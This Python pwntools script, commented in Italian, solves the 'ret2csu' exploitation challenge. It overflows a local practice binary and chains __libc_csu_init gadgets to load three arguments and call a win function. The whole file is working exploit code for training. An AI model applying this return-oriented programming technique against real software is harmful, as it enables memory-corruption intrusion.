from pwn import *

elf = ELF('ret2csu')
p = process("./ret2csu")


'''
Per questo problema dobbiamo trovare dei gadget caricati dalla libreria dinamicamente. 
Li troviamo eseguendo:
 ret2csu$ gdb ret2csu
 gef> disass __libc_csu_init
'''

ret2win = p64(0x400510)
mov_rdx_r15_mov_rsi_r14_mov_edi_r13d_call = p64(0x0000000000400680)
pop_rbx_rbp_r12_r13_r14_r15 = p64(0x000000000040069a)
pop_rdi = p64(0x00000000004006a3)

payload = b""

payload += pop_rbx_rbp_r12_r13_r14_r15
payload += p64(0) # rbx = 0
payload += p64(1) # rbp = 1 per comparare con rbx dopo add rbx, 1 e non eseguire la jne 
payload += p64(0x600e48) # r12 = indirizzo di fini address su sezione .dynamic -> serve per non eseguire nulla
payload += p64(0) # r13 non utile per rdi, parametro 1 settato successivamente
payload += p64(0xcafebabecafebabe) # r14 = parametro 2
payload += p64(0xd00df00dd00df00d) # r15 = parametro 3

payload += mov_rdx_r15_mov_rsi_r14_mov_edi_r13d_call
payload += p64(0) * 7 # serve per i pop successivi

payload += pop_rdi
payload += p64(0xdeadbeefdeadbeef)

payload += ret2win



p.recvuntil('> ')
p.sendline(cyclic(40) + payload)
p.interactive()
